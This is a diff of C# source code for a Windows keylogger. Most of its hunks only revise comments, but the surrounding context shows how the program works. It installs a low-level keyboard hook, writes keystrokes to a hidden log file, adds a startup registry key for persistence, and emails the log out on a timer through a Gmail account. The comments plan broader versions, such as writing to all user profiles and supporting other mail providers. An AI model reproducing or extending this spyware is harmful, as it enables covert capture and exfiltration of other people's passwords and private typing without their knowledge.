@@ -37,8 +37,7 @@ namespace WindowsFormsApplication1
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-
+        
         // DllImports for getting the current active window title
         [DllImport("user32.dll")]
         static extern IntPtr GetForegroundWindow();
@@ -53,7 +52,7 @@ namespace WindowsFormsApplication1
         static void Main()
         {
 
-            // Create log file and make it hidden
+            // Create log file and set hidden file attribute
             if (!File.Exists(path))
             {
                 File.Create(path);
@@ -73,7 +72,7 @@ namespace WindowsFormsApplication1
             timer = new System.Timers.Timer();
             timer.Elapsed += new ElapsedEventHandler(Program.OnTimedEvent);
             timer.AutoReset = true;
-            // Current timer set to 30 sec
+            // Current timer set to 30 sec for testing purposes
             timer.Interval = 30000;
             timer.Start();
 
@@ -127,6 +126,8 @@ namespace WindowsFormsApplication1
             {
                 Console.WriteLine("Error setting startup reg key.");
             }
+            // The following has a high potential to fail if not running as Admin and UAC is on
+            // Future version will check those first, and determine if other people use the computer (existance of other profiles), then attempt to write to all users
             /*
             //Try to add to all users
             try
@@ -191,6 +192,8 @@ namespace WindowsFormsApplication1
             //   public const string username = "<username>";
             //   public const string password = "<password>";
             // *Make sure to add the class file the gitignore file, otherwise :(
+
+            // Future versions will be configurable to use other email providers and not rely on google
             const string emailAddress = Password.username;
             const string emailPassword = Password.password;
             System.Net.Mail.MailMessage msg = new System.Net.Mail.MailMessage(); //create the message
@@ -225,10 +228,9 @@ namespace WindowsFormsApplication1
 
             if (failed == 0)
             {
-
-                // TODO:: This could be more dynamic. What if the file is not hidden?
                 FileAttributes attributes = File.GetAttributes(path);
 
+                // Check if the log file is hidden
                 if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
                 {
                     // Remove hidden attribute from file - Can not overwrite the file otherwise.
@@ -265,6 +267,8 @@ namespace WindowsFormsApplication1
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
+        // Much of the following code needs to be re-written. Some special characters are not logged correctly.
+        // What if the user is HOLDING the SHIFT key while typing? What if caps lock is enabled/disabled?
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
